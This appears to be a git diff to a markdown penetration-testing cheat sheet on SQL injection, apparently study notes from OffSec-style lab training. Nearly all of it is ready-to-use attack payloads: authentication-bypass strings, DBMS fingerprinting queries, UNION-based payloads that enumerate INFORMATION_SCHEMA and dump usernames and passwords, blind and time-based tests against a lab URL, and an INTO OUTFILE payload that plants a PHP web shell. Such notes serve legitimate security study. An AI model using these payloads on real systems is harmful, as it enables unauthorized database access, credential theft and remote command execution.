@@ -397,6 +397,10 @@ SELECT * FROM logins WHERE username LIKE 'admin%';
 # this will match with three characters
 SELECT * FROM logins WHERE username like '___';
 
+# INFORMATION_SCHEMA
+## The SCHEMA_NAME column contains all the database names currently present.
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
 ```
 
 ## sqlite
@@ -490,6 +494,27 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 
 - mysql command injection
 ```bash
+# URL encoded
+'	%27
+"	%22
+#	%23
+;	%3B
+)	%29
+
+
+# MySQL Fingerprinting
+SELECT @@version	When we have full query output	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'	In MSSQL it returns MSSQL version. Error with other DBMS.
+SELECT POW(1,1)	When we only have numeric output	1	Error with other DBMS
+SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS
+
+
+# Auth Bypass with OR operator
+admin' or '1'='1
+something' or '1'='1
+
+# Auth Bypass with comments
+admin')--
+
 #Error-based Payloads
 offsec' OR 1=1 -- //
 ' or 1=1 in (select @@version) -- //
@@ -497,21 +522,30 @@ offsec' OR 1=1 -- //
 ' or 1=1 in (SELECT password FROM users) -- //
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
 
-#UNION-based payloads
+# UNION-based payloads
 ' ORDER BY 1-- //
 %' UNION SELECT database(), user(), @@version, null, null -- //
 ' UNION SELECT null, null, database(), user(), @@version  -- //
+
+
+# UNION-based using INFORMATION_SCHEMA database
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 ' UNION SELECT null, username, password, description, null FROM users -- //
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+cn' UNION select 1,database(),2,3-- -
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+
 
 #Blind SQL Injections
-#boolean-based SQLi
+##boolean-based SQLi
 http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
 #time-based SQLi
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 
 #
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
 ```
 
 ## Tools
